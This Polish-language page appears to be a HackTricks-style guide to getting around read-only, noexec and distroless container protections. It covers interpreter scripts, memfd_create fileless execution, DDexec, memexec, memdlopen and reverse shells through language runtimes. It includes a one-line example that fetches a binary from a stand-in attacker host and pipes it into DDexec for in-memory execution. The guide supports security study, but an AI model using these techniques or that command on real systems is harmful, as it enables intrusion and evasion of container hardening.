# Obejście zabezpieczeń FS: read-only / no-exec / Distroless

## Videos

W poniższych materiałach wideo techniki wymienione na tej stronie zostały wyjaśnione bardziej szczegółowo:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## scenariusz read-only / no-exec

W kontenerze można zamontować główny system plików jako tylko do odczytu, ustawiając **`readOnlyRootFilesystem: true`** w kontekście bezpieczeństwa.<sup>[[3]](#references)</sup> Na przykład:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Główny system plików tylko do odczytu nie sprawia, że osobno zamontowane woluminy stają się tylko do odczytu. Docker traktuje **`/dev/shm`** jako mount IPC, natomiast opcje tmpfs, takie jak `rw` i `noexec`, są ustawieniami konfiguracyjnymi środowiska uruchomieniowego; przed poleganiem na którymkolwiek z tych zachowań należy sprawdzić opcje mount kontenera docelowego.<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> Z perspektywy red teamu takie połączenie może utrudnić pobieranie i wykonywanie binariów, które nie są już dostępne (na przykład backdoorów lub narzędzi do enumeracji).<sup>[[4]](#references)[[5]](#references)</sup>

## Najłatwiejsze obejście: Scripts

Mount `noexec` blokuje bezpośrednie wykonywanie binariów znajdujących się na tym mount, ale interpreter nadal może odczytać i zinterpretować skrypt. Jeśli dostępne jest `sh` lub `python`, można więc uruchomić skrypt shellowy lub skrypt Python za pośrednictwem tego interpretera.<sup>[[5]](#references)</sup>

Nie pomaga to, gdy wymagane narzędzie samo jest binarium.<sup>[[5]](#references)</sup>

## Obejścia oparte na pamięci

Gdy bezpośrednie wykonywanie z zamontowanej ścieżki jest zablokowane, jedną z możliwości jest załadowanie ELF do pamięci i wykonanie go za pośrednictwem ścieżki w pamięci. Omija to kontrolę `noexec` na tym mount, ale nie usuwa innych mechanizmów kontroli jądra, uprawnień ani zasad.<sup>[[5]](#references)[[6]](#references)</sup>

### Obejście FD + exec syscall

Jeśli środowisko uruchomieniowe skryptów może uzyskać dostęp do odpowiedniego interfejsu Linux, może utworzyć anonimowy deskryptor pliku wspierany przez RAM za pomocą **`memfd_create(2)`**, zapisać w nim bajty ELF i użyć ścieżki wykonywania opartej na fd. Projekt [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) generuje skompresowany i zakodowany w base64 kod Python, Perl lub Ruby na potrzeby tego procesu.<sup>[[6]](#references)[[7]](#references)</sup>

Projekt obecnie dokumentuje cele Python, Perl i Ruby; PHP lub Node wymagają innej techniki lub rozszerzenia zależnego od środowiska uruchomieniowego, więc brak generatora dla danego języka nie oznacza, że wykonywanie z pamięci jest niemożliwe.<sup>[[6]](#references)[[12]](#references)</sup>

> [!WARNING]
> Zwykły plik wykonywalny zapisany w **`/dev/shm`** nadal podlega ustawieniu **`noexec`** tego mount; samo otwarcie go za pośrednictwem zwykłego deskryptora pliku nie zmienia zasad mount.<sup>[[5]](#references)</sup>
>
> Dokładna metoda wykonywania z pamięci zależy również od środowiska uruchomieniowego, architektury, jądra i dostępnych uprawnień.<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) zapisuje stager i loader do działającego procesu shell za pośrednictwem **`/proc/self/mem`**, a następnie przekazuje wykonanie temu kodowi.<sup>[[8]](#references)</sup>

Umożliwia to procesowi załadowanie dostarczonego binarium bez wcześniejszego umieszczania go w systemie plików z uprawnieniem wykonywania.<sup>[[8]](#references)</sup>

> [!TIP]
> **DDexec / EverythingExec** może ładować i **wykonywać** shellcode lub binarium z **pamięci**.<sup>[[8]](#references)</sup>
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Więcej informacji na temat tej techniki znajdziesz na Githubie lub:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) to implementacja DDexec działająca jako daemon. Jego daemon nasłuchuje żądań zawierających argumenty i surowe bajty programu, tworzy proces potomny w celu załadowania i uruchomienia każdego programu, a proces nadrzędny pozostaje serwerem.<sup>[[9]](#references)</sup>

Repozytorium zawiera przykład użycia **memexec do wykonywania plików binarnych z reverse shellu PHP** w [a.php](https://github.com/arget13/memexec/blob/main/a.php).<sup>[[9]](#references)</sup>

### Memdlopen

[**memdlopen**](https://github.com/arget13/memdlopen), podobnie jak DDexec, to bezplikowa implementacja `dlopen()` dla obiektu współdzielonego lub programu. README obecnie dokumentuje obsługę ARM64, dlatego przed użyciem sprawdź architekturę celu.<sup>[[10]](#references)</sup>

## Obejście Distroless

Aby uzyskać szczegółowe wyjaśnienie **czym właściwie jest distroless**, kiedy pomaga, kiedy nie pomaga oraz jak zmienia post-exploitation tradecraft w kontenerach, sprawdź:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Czym jest distroless

Obrazy distroless zawierają wyłącznie aplikację i jej zależności runtime; oficjalne obrazy nie zawierają package managerów, shelli ani innych programów oczekiwanych w standardowej dystrybucji Linux.<sup>[[11]](#references)</sup>

Ograniczenie obrazu runtime do tych zależności zmniejsza ilość oprogramowania obecnego w środowisku produkcyjnym oraz ilość oprogramowania, które trzeba skanować i śledzić.<sup>[[11]](#references)</sup>

### Reverse Shell

W kontenerze distroless możesz **nie znaleźć `sh` ani `bash`** do uruchomienia zwykłego shella ani popularnych narzędzi, takich jak `ls`, `whoami` czy `id`.<sup>[[11]](#references)</sup>

> [!WARNING]
> W związku z tym typowy reverse shell oparty na shellu lub enumeracja oparta na narzędziach mogą nie działać.<sup>[[11]](#references)</sup>

Jeśli zaatakowana aplikacja zawiera runtime języka (na przykład Python dla aplikacji Flask lub Node.js dla aplikacji Node), RCE nadal może umożliwiać użycie tego runtime do utworzenia kanału poleceń i inspekcji systemu za pośrednictwem jego API.<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> Użyj dostępnego języka skryptowego do **enumeracji systemu** za pomocą jego funkcji językowych.<sup>[[12]](#references)</sup>

Jeśli nie ma zabezpieczeń **read-only/no-exec**, kanał poleceń może zapisywać pliki binarne w zapisywalnym i wykonywalnym mouncie, a następnie je uruchamiać; najpierw zweryfikuj opcje mountu i uprawnienia.<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> Gdy te zabezpieczenia są obecne, użyj opisanych powyżej **technik memory-execution**, jeśli pozwalają na to runtime, kernel i uprawnienia.<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

Przykłady wykorzystywania podatności RCE w celu uzyskania **reverse shelli** w językach skryptowych oraz wykonywania plików binarnych z pamięci znajdziesz w [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - Eksplorowanie manipulacji pamięcią Linuxa na potrzeby skrytości i unikania wykrycia](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Skryte włamania z DDexec-ng i dlopen() w pamięci - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Konfigurowanie kontekstu bezpieczeństwa dla poda lub kontenera](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - strona podręcznika Linux](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - strona podręcznika Linux](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
